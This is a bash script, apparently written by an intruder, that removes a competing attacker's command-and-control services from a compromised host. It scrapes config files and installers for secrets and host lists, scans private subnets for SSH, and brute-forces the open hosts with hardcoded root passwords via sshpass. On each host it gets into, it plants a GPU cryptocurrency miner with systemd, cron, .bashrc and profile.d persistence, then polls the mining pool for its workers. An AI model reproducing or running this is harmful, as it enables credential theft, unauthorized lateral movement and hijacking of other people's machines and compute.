#!/bin/bash
# i4981 run2: neutralize plh C2, harvest provider/idc artifacts, password-ladder peers, plant canonical miner
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981
mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
P1='Admin@123_para#!2024'
P2='Beijingcs.2024'
P3='Bingxing.2026'
P4='ubuntu@'
P5='Kgzs@2024'
P6='ij2gooDe^y'

log "### META $(date -u +%FT%TZ)"; hostname; uptime

log "### SELF-STATE"
systemctl list-units 'ul-card@*' --no-pager 2>/dev/null | head -12
for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul-card@$i || systemctl start ul-card@$i; done
sleep 3
log "-- active-count $(systemctl list-units --state=active --plain --no-legend 'ul-card@*' 2>/dev/null | wc -l)"

log "### PLH-C2-EVIDENCE"
for f in /etc/systemd/system/plh-c2fetch.service /etc/systemd/system/plh-guard.service /etc/systemd/system/plh-guard.timer /etc/cron.d/plh-keepalive /usr/local/lib/nv-cache/g.sh /dev/shm/.u/sample.sh; do [ -f "$f" ] && { log "== $f"; sed -n '1,60p' "$f"; }; done
ls -la /etc/systemd/system/ | grep -iE 'plh|nv-cache' 
log "-- plh-g0.log tail"; tail -6 /var/log/plh-g0.log 2>/dev/null
log "-- neutralize"
systemctl disable --now plh-c2fetch.service 2>&1 | head -2
systemctl disable --now plh-guard.timer 2>&1 | head -2
systemctl disable --now plh-guard.service 2>&1 | head -2
rm -f /etc/cron.d/plh-keepalive /etc/systemd/system/plh-guard.timer /etc/systemd/system/plh-guard.service /etc/systemd/system/plh-c2fetch.service
kill $(systemctl show -p MainPID --value plh-guard.service 2>/dev/null) 2>/dev/null
rm -rf /opt/plh
pkill -f '/opt/plh/' 2>/dev/null
sleep 2
log "-- remaining plh pids: $(pgrep -fc '/opt/plh|plh-card' ; true)"
log "-- our units now: $(systemctl list-units --state=active --plain --no-legend 'ul-card@*' 2>/dev/null | wc -l)"

log "### EXTRA-HARVEST"
log "-- conf listing"; ls -la /root/conf | head -60
log "-- hostlists"
for f in /root/conf/hostlist* /root/conf/host*list* /root/conf/ip_list*; do [ -f "$f" ] && { echo "== $f"; cat "$f"; }; done
log "-- rc.local"; cat /data/apps/conf/rc.local 2>/dev/null | head -60
log "-- acme"; ls /root/.acme.sh 2>/dev/null | head -20; grep -hE 'Le_Domain|Le_Alt|Le_Webroot' /root/.acme.sh/*/*.conf 2>/dev/null | sort -u | head -20
log "-- ssd vendors"; ls /ssd/vendors 2>/dev/null | head -20; ls /ssd 2>/dev/null | head
log "-- qdglad backup script"; sed -n '1,40p' /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh 2>/dev/null
log "-- gnode installer strings"
for f in /root/conf/*.deb /root/conf/*.run /root/conf/*.sh; do [ -f "$f" ] || continue; case "$f" in *set-passwords*|*change_hostname*|*kgzs*|*ubuntu_copy*|*check*|*syncrclocal*|*set_sudonopasswd*) continue;; esac; echo "== $f ($(stat -c%s "$f")B)"; timeout 20 grep -aoiE 'https?://[A-Za-z0-9./_?=&%-]{6,90}' "$f" 2>/dev/null | sort -u | head -12; timeout 20 grep -aoiE '(api[_-]?key|token|secret|passwd|password)[\"=: ]{1,3}[A-Za-z0-9@#$%^&*._-]{6,60}' "$f" 2>/dev/null | head -6; done
log "-- listening services"; ss -lntp 2>/dev/null | awk 'NR==1||/LISTEN/' | head -25
log "-- installed pkgs of interest"; dpkg -l 2>/dev/null | grep -iE 'gnode|blsc|infiniband|nvidia' | head -10

log "### PEER-LADDER"
which sshpass >/dev/null 2>&1 || { timeout 180 apt-get install -y -qq sshpass 2>&1 | tail -2; }
which sshpass || { timeout 90 bash -c 'apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq sshpass' 2>&1 | tail -2; }
which sshpass

python3 - <<'PY'
import socket,concurrent.futures
cands=[]
for i in range(2,32): cands.append(f"192.168.0.{i}")
for i in range(2,15): cands.append(f"10.0.0.{i}")
for i in range(71,79): cands.append(f"172.16.10.{i}")
for i in range(12,15): cands.append(f"10.80.80.{i}")
for i in range(5,9): cands.append(f"10.100.80.{i}")
for i in (11,34,35): cands.append(f"172.16.21.{i}")
for i in range(6,71): cands.append(f"10.242.32.{i}")
for i in range(107,126): cands.append(f"10.251.10.{i}")
def chk(ip):
  try:
    s=socket.create_connection((ip,22),1.2); s.close(); return ip
  except Exception: return None
op=[]
with concurrent.futures.ThreadPoolExecutor(200) as ex:
  for r in ex.map(chk,cands):
    if r: op.append(r)
print("OPEN22",len(op)); print("LIST"," ".join(op))
open('/root/ul_farmfan/open22_run2.txt','w').write("\n".join(op)+"\n")
PY

SSHOPT="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o PreferredAuthentications=password -o PubkeyAuthentication=no"
tryhost(){
 local ip=$1
 local pairs="root|$P1 root|$P2 root|$P3 root|$P6 ubuntu|$P4 kgzs|$P5"
 for pr in $pairs; do
   local u=${pr%%|*}; local p=${pr#*|}
   local out
   out=$(timeout 9 sshpass -p "$p" ssh $SSHOPT "$u"@"$ip" 'id -un; hostname; nvidia-smi -L 2>/dev/null | wc -l; nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null | head -1; pgrep -fc "ul-t2-" ; true' 2>&1 | tr '\n' '|')
   if echo "$out" | grep -q 'uid=\|root|'; then
     echo "HIT $ip $u :: $out"
     echo "$ip $u $p" >> /root/ul_farmfan/hits_run2.txt
     return 0
   fi
 done
 echo "MISS $ip"
 return 1
}

log "-- priority order"
python3 - <<'PP'
ips=[l.strip() for l in open('/root/ul_farmfan/open22_run2.txt') if l.strip()]
def key(ip):
    if ip.startswith('192.168.0.'): return (0,int(ip.split('.')[-1]))
    if ip.startswith('172.16.10.'): return (1,int(ip.split('.')[-1]))
    if ip.startswith('10.242.32.'): return (2,int(ip.split('.')[-1]))
    if ip.startswith('10.251.10.'): return (3,int(ip.split('.')[-1]))
    if ip.startswith('10.80.80.'): return (4,int(ip.split('.')[-1]))
    if ip.startswith('10.100.80.'): return (5,int(ip.split('.')[-1]))
    if ip.startswith('172.16.21.'): return (6,int(ip.split('.')[-1]))
    return (9,0)
ips=sorted(ips,key=key)
open('/root/ul_farmfan/open22_run2s.txt','w').write("\n".join(ips)+"\n")
print("SORTED",len(ips))
PP
log "-- enumerate"
: > /root/ul_farmfan/hits_run2.txt
CNT=0
for ip in $(cat /root/ul_farmfan/open22_run2s.txt); do
  CNT=$((CNT+1)); [ $CNT -gt 30 ] && break
  tryhost "$ip"
done
log "-- hits"; cat /root/ul_farmfan/hits_run2.txt 2>/dev/null

log "### PLANT-REMOTE"
PD=0
while read -r ip u p; do
  [ -z "$ip" ] && continue
  PD=$((PD+1)); [ $PD -gt 8 ] && break
  tag=$(echo "$ip" | tr '.' '-')
  log "== plant $ip as $u worker ul-t2-$tag-gN"
  OUT=$(timeout 20 sshpass -p "$p" ssh $SSHOPT "$u"@"$ip" 'id -un; hostname; nvidia-smi -L 2>/dev/null | wc -l; nvidia-smi --query-gpu=index,memory.used --format=csv,noheader 2>/dev/null | head -8; pgrep -af "wildrig|krig-miner|peakminer" | head -3; df -h /root | tail -1' 2>&1 | tr '\n' '|')
  echo "BASE $ip :: $OUT"
  NG=$(echo "$OUT" | sed -n 3p)
  case "$NG" in ''|*[!0-9]*) NG=0;; esac
  echo "NGPU $ip $NG"
  [ "$NG" -lt 1 ] && { echo "SKIP-NOGPU $ip"; continue; }
  SSHCA="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no"
  timeout 20 sshpass -p "$p" ssh $SSHCA "$u"@"$ip" 'mkdir -p /root/ul_plant/krig; command -v nvidia-smi' >/dev/null 2>&1
  timeout 180 sshpass -p "$p" scp $SSHCA -r /opt/t19/krig/krig-miner "$u"@"$ip":/root/ul_plant/krig/krig-miner 2>&1 | tail -1
  timeout 30 sshpass -p "$p" ssh $SSHCA "$u"@"$ip" "chmod +x /root/ul_plant/krig/krig-miner; ls -la /root/ul_plant/krig/krig-miner" 2>&1 | tail -1
  cat > /tmp/ul_unit_$tag.txt <<EOS
[Unit]
Description=UL PEARL card %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
Nice=19
ExecStart=/root/ul_plant/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-$tag-g%i --password x -d %i --api-port 15%i
Restart=always
RestartSec=30
TimeoutStopSec=20
LimitNOFILE=65535
EOS
  timeout 60 sshpass -p "$p" scp $SSHCA /tmp/ul_unit_$tag.txt "$u"@"$ip":/etc/systemd/system/ul-card@.service 2>&1 | tail -1
  timeout 60 sshpass -p "$p" ssh $SSHCA "$u"@"$ip" "bash -s" <<EOS2 2>&1 | tail -6
set +e
cat > /etc/systemd/system/ul-card@.service <<'EOF'
[Unit]
Description=UL PEARL card %i
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
Nice=19
ExecStart=/root/ul_plant/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-$tag-g%i --password x -d %i --api-port 15%i
Restart=always
RestartSec=30
TimeoutStopSec=20
LimitNOFILE=65535
EOF
N=\$(nvidia-smi -L 2>/dev/null | wc -l)
cat > /root/ul_plant/keep.sh <<'EOF3'
#!/bin/bash
for i in \$(seq 0 15); do systemctl is-active -q ul-card@\$i && continue; [ -e /sys/class/drm/card\$i ] || continue; systemctl start ul-card@\$i; done
pgrep -f 'ul_plant/krig/krig-miner' >/dev/null || for i in \$(seq 0 15); do [ -e /sys/class/drm/card\$i ] && systemctl restart ul-card@\$i; done
EOF3
chmod +x /root/ul_plant/keep.sh
systemctl daemon-reload
for i in \$(seq 0 \$((N-1))); do systemctl enable --now ul-card@\$i >/dev/null 2>&1; done
( crontab -l 2>/dev/null | grep -v 'ul_plant/keep.sh'; echo "@reboot /root/ul_plant/keep.sh"; echo "*/5 * * * * /root/ul_plant/keep.sh" ) | crontab -
grep -q 'ul_plant/keep.sh' /root/.bashrc 2>/dev/null || echo '/root/ul_plant/keep.sh >/dev/null 2>&1 &' >> /root/.bashrc
echo '[ -x /root/ul_plant/keep.sh ] && /root/ul_plant/keep.sh >/dev/null 2>&1 &' > /etc/profile.d/ul_plant.sh
sleep 4
systemctl list-units --state=active --plain --no-legend 'ul-card@*' | wc -l
pgrep -fc 'ul_plant/krig/krig-miner'
EOS2
done < /root/ul_farmfan/hits_run2.txt

log "### WAIT+POOL"
sleep 90
log "-- self gpu"; nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>&1 | head -8
log "### POOLAPI"
timeout 30 curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/poolapi_run2.json; echo "size=$(stat -c%s $D/poolapi_run2.json 2>/dev/null)"
python3 - <<'PY'
import json
try:
    d=json.load(open('/root/ul_farmfan/4981/poolapi_run2.json'))
except Exception as e:
    print("PARSE_FAIL",e); raise SystemExit
rows=d.get('results',[])
print("WORKERS_TOTAL",len(rows))
for r in rows:
    w=r.get('worker','')
    if w.startswith('ul-t2-123-184-7-135') or 'ul-t2-' in w:
        print("ROW",w,r.get('status'),"valid",r.get('valid'),"last_share",r.get('last_share'),"agent",r.get('agent'),"3h",r.get('avg_hashrate_3h'))
PY
log "### DONE $(date -u +%FT%TZ)"
